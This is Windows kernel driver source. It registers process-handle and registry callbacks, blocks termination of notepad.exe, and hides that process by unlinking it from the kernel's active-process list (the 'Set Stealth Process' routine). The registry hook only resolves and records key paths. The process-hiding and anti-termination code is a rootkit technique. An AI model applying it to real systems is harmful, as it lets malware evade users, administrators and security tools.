#include "StdAfx.h"
#pragma warning(default : 4061)

PVOID g_RegHandle = NULL;
OB_PREOP_CALLBACK_STATUS ObPreCallBack(
	_In_ PVOID RegContext,
	_Inout_ POB_PRE_OPERATION_INFORMATION ObPreOperInfo
)
{
	CHAR ProcName[MAX_KPATH] = { 0 };
	WCHAR ProcNameW[MAX_KPATH] = { 0 };
	PEPROCESS pEProcess = (PEPROCESS)ObPreOperInfo->Object;

	UNREFERENCED_PARAMETER(RegContext);

	if (KeGetCurrentIrql() != PASSIVE_LEVEL) DbgPrint("KeGetCurrentIrql[0x%X]", KeGetCurrentIrql());

	GetProcessFullPath(pEProcess, ProcNameW);
	MyWideCharToChar(ProcNameW, ProcName, MAX_KPATH);
	if (*ProcName) {
		if (!_stricmp("notepad.exe", ProcName)) {
			if (ObPreOperInfo->Operation == OB_OPERATION_HANDLE_CREATE) {
				if (ObPreOperInfo->Parameters->CreateHandleInformation.DesiredAccess & PROCESS_TERMINATE) {
					ObPreOperInfo->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
					DbgPrint("Set Protect Process");
				}
			}
		}
	}
	else DbgPrint("Failed to Get Process Name");

	return OB_PREOP_SUCCESS;
}

VOID ObPostCallBack(
	_In_ PVOID RegContext,
	_Inout_ POB_POST_OPERATION_INFORMATION OperInfo
)
{
	PEPROCESS pEProcess = (PEPROCESS)OperInfo->Object;
	PLIST_ENTRY pListEntry;
	CHAR ProcName[MAX_KPATH] = { 0 };
	WCHAR ProcNameW[MAX_KPATH] = { 0 };
	ULONG_PTR ProcAddress = (ULONG_PTR)pEProcess;

	UNREFERENCED_PARAMETER(RegContext);

	GetProcessFullPath(pEProcess, ProcNameW);
	MyWideCharToChar(ProcNameW, ProcName, MAX_KPATH);
	if (*ProcName) {
		if (!_stricmp("notepad.exe", ProcName)) {
			pListEntry = (PLIST_ENTRY)((ULONG_PTR)ProcAddress + ACTIVE_PROCESS_LINKS);

			if (pListEntry->Flink == NULL || pListEntry->Blink == NULL) return;

			pListEntry->Flink->Blink = pListEntry->Blink;
			pListEntry->Blink->Flink = pListEntry->Flink;

			pListEntry->Flink = NULL;
			pListEntry->Blink = NULL;

			DbgPrint("Set Stealth Process");
		}
	}
	else DbgPrint("Failed to Get Process Name");

}

NTSTATUS StartProtectProcess()
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	OB_CALLBACK_REGISTRATION ObCBReg = { 0 };
	OB_OPERATION_REGISTRATION ObOperReg = { 0 };

	ObOperReg.ObjectType = PsProcessType;
	ObOperReg.PreOperation = ObPreCallBack;
	ObOperReg.PostOperation = ObPostCallBack;
	ObOperReg.Operations = OB_OPERATION_HANDLE_CREATE;

	ObCBReg.Version = OB_FLT_REGISTRATION_VERSION;
	ObCBReg.OperationRegistrationCount = 1;
	ObCBReg.OperationRegistration = &ObOperReg;
	RtlInitUnicodeString(&ObCBReg.Altitude, L"370071");
	ObCBReg.RegistrationContext = NULL;

	Status = ObRegisterCallbacks(&ObCBReg, &g_RegHandle);

	DbgPrint("ObRegisterCallbacks Status[0x%X]", Status);
	return Status;
}

VOID StopProtectProcess()
{
	if (g_RegHandle != NULL) ObUnRegisterCallbacks(g_RegHandle);
}

LARGE_INTEGER g_RegisterCookie = { 0 };


//Registry
REG_ROOTKEYW g_RootKeys[] = {
	{L"\\REGISTRY\\MACHINE", L"HKEY_LOCAL_MACHINE", 0},
	{L"\\REGISTRY\\USER", L"HKEY_USERS", 0},
};
ULONG g_RootKeyCnt = sizeof(g_RootKeys) / sizeof(REG_ROOTKEYW);

REG_LINKKEYW g_ControlSet = { L"\\SYSTEM\\ControlSet001", L"\\SYSTEM\\CurrentControlSet" };
REG_LINKKEYW g_CHPCurrent = { L"\\SYSTEM\\CurrentControlSet\\Hardware Profiles\\0001",
	L"\\SYSTEM\\CurrentControlSet\\Hardware Profiles\\Current" };

BOOL GetRegPath(PMINIFLT_INFO MiniFltInfo, PVOID pRootObject, PUNICODE_STRING pValueName)
{
	NTSTATUS Status;
	PVOID pKeyObj = NULL;
	PWCHAR pRoot = NULL, pRest = NULL;
	PUNICODE_STRING UniStringKey;
	ULONG i, PathWLen, TempLen = 0, ByteSize = MAX_REGPATH * sizeof(WCHAR);
	LONG SubLen;

	UniStringKey = MyAllocNonPagedPool(ByteSize + sizeof(UNICODE_STRING), &g_NonPagedPoolCnt);
	if (!UniStringKey) return FALSE;

	UniStringKey->Buffer = NULL;

	if (pRootObject) pKeyObj = pRootObject;

	if (pKeyObj) {
		UniStringKey->MaximumLength = (USHORT)ByteSize;
		Status = ObQueryNameString(pKeyObj, (POBJECT_NAME_INFORMATION)UniStringKey, ByteSize, &TempLen);
		if (Status == STATUS_SUCCESS || UniStringKey->Buffer)
		{
			TempLen = UniStringKey->Length / 2;
		}

		if (!UniStringKey->Buffer) {
			MyFreeNonPagedPool(UniStringKey, &g_NonPagedPoolCnt);
			return FALSE;
		}
	}

	__try {
		SubLen = MAX_REGPATH - TempLen - 2;
		if (pValueName && (SubLen > 0)) {
			if (SubLen > (pValueName->Length / 2)) SubLen = pValueName->Length / 2;

			TempLen += MySNPrintfW(UniStringKey->Buffer + TempLen, MAX_REGPATH - TempLen, 
				L"\\%*.*s", SubLen, SubLen, pValueName->Buffer);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		MyFreeNonPagedPool(UniStringKey, &g_NonPagedPoolCnt);
		return FALSE;
	}

	for (i = 0; i < g_RootKeyCnt; i++) {
		if (_wcsnicmp(UniStringKey->Buffer, g_RootKeys[i].KRootName, g_RootKeys[i].KRootLen)) continue;

		pRoot = g_RootKeys[i].URootName;
		pRest = UniStringKey->Buffer + g_RootKeys[i].KRootLen;

		break;
	}

	__try {
		PWCHAR TmpPath = NULL;

		if (!pRest) {
			pRest = UniStringKey->Buffer;
		}

		PathWLen = MyStrNCopyW(MiniFltInfo->RegPathW, pRoot, -1, MAX_KPATH);

		if (!_wcsnicmp(g_ControlSet.OriName, pRest, g_ControlSet.OriLen)) {
			TmpPath = MyAllocNonPagedPool(MAX_KPATH * sizeof(WCHAR), &g_NonPagedPoolCnt);
			if (TmpPath != NULL) {
				TempLen = MySNPrintfW(TmpPath, MAX_KPATH, L"%s", g_ControlSet.LinkName);
				MyStrNCopyW(TmpPath + TempLen, pRest + g_ControlSet.OriLen, -1, MAX_KPATH - TempLen);

				if (!_wcsnicmp(g_CHPCurrent.OriName, TmpPath, g_CHPCurrent.OriLen)) {
					PathWLen += MySNPrintfW(MiniFltInfo->RegPathW + PathWLen, MAX_KPATH - PathWLen, L"%s",
						g_CHPCurrent.LinkName);
					PathWLen += MyStrNCopyW(MiniFltInfo->RegPathW + PathWLen, TmpPath + g_CHPCurrent.OriLen,
						-1, MAX_KPATH - PathWLen);
				}
				else {
					PathWLen += MyStrNCopyW(MiniFltInfo->RegPathW + PathWLen, TmpPath, -1, MAX_KPATH - PathWLen);
				}
			}
		}
		if (TmpPath != NULL) {
			MyFreeNonPagedPool(TmpPath, &g_NonPagedPoolCnt);
		}
		else {
			PathWLen += MyStrNCopyW(MiniFltInfo->RegPathW + PathWLen, pRest, -1, MAX_KPATH - PathWLen);
		}

		if (PathWLen > 0 && MiniFltInfo->RegPathW[PathWLen - 1] == L'\\') {
			MiniFltInfo->RegPathW[--PathWLen] = 0;
		}

		MyWideCharToChar(MiniFltInfo->RegPathW, MiniFltInfo->RegPath, MAX_KPATH);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		MyFreeNonPagedPool(UniStringKey, &g_NonPagedPoolCnt);

		return FALSE;
	}

	MyFreeNonPagedPool(UniStringKey, &g_NonPagedPoolCnt);

	return TRUE;
}

NTSTATUS DecisionRegCallback(
	_In_ ULONG Action, 
	_In_ PVOID pRootObject, 
	_Inout_ PUNICODE_STRING pValueName
)
{
	NTSTATUS Status = STATUS_SUCCESS; // STATUS_ACCESS_DENIED
	PMINIFLT_INFO MiniFltInfo;
	BOOL bGetRegPath;
	
	UNREFERENCED_PARAMETER(Action);

	if (!pRootObject) return Status;

	MiniFltInfo = (PMINIFLT_INFO)ExAllocateFromNPagedLookasideList(&g_MiniFltLookaside);
	if (MiniFltInfo == NULL) return Status;

	bGetRegPath = GetRegPath(MiniFltInfo, pRootObject, pValueName);


	ExFreeToNPagedLookasideList(&g_MiniFltLookaside, MiniFltInfo);

	return Status;
}

NTSTATUS RegisterCallback(
	_In_ PVOID CallbackContext, 
	_In_ PVOID Argument1, 
	_In_ PVOID Argument2
)
{
	REG_NOTIFY_CLASS RegNotifyType = (REG_NOTIFY_CLASS)Argument1;
	NTSTATUS Status = STATUS_SUCCESS;

	UNREFERENCED_PARAMETER(CallbackContext);

	switch (RegNotifyType) {
		case RegNtPreCreateKeyEx: {
			PREG_CREATE_KEY_INFORMATION pRegCreateKey = (PREG_CREATE_KEY_INFORMATION)Argument2;

			if (pRegCreateKey != NULL) {
				Status = DecisionRegCallback(ACTION_KEY_CREATE, pRegCreateKey->RootObject, pRegCreateKey->CompleteName);
			}

			break;
		}
		case RegNtPreRenameKey:
		case RegNtPreDeleteKey: {
			PREG_DELETE_KEY_INFORMATION pRegDeleteKey = (PREG_DELETE_KEY_INFORMATION)Argument2;

			if (pRegDeleteKey != NULL) {
				Status = DecisionRegCallback(ACTION_KEY_DELETE, pRegDeleteKey->Object, NULL);
			}

			break;
		}
		case RegNtPreSetValueKey: {
			PREG_SET_VALUE_KEY_INFORMATION pRegSetValueKey = (PREG_SET_VALUE_KEY_INFORMATION)Argument2;

			if (pRegSetValueKey != NULL) {
				Status = DecisionRegCallback(ACTION_VALUE_WRITE, pRegSetValueKey->Object, pRegSetValueKey->ValueName);
			}

			break;
		}
		case RegNtPreDeleteValueKey: {
			PREG_DELETE_VALUE_KEY_INFORMATION pRegDeleteValueKey = (PREG_DELETE_VALUE_KEY_INFORMATION)Argument2;

			if (pRegDeleteValueKey != NULL) {
				Status = DecisionRegCallback(ACTION_VALUE_DELETE, pRegDeleteValueKey->Object, pRegDeleteValueKey->ValueName);
			}

			break;
		}

		default: break;
	}

	return Status;
}

VOID StartRegHook()
{
	if (g_RegisterCookie.QuadPart != 0) return;

	CmRegisterCallback(RegisterCallback, NULL, &g_RegisterCookie);
}

VOID StopRegHook()
{
	if (g_RegisterCookie.QuadPart == 0) return;

	CmUnRegisterCallback(g_RegisterCookie);
	g_RegisterCookie.QuadPart = 0;
}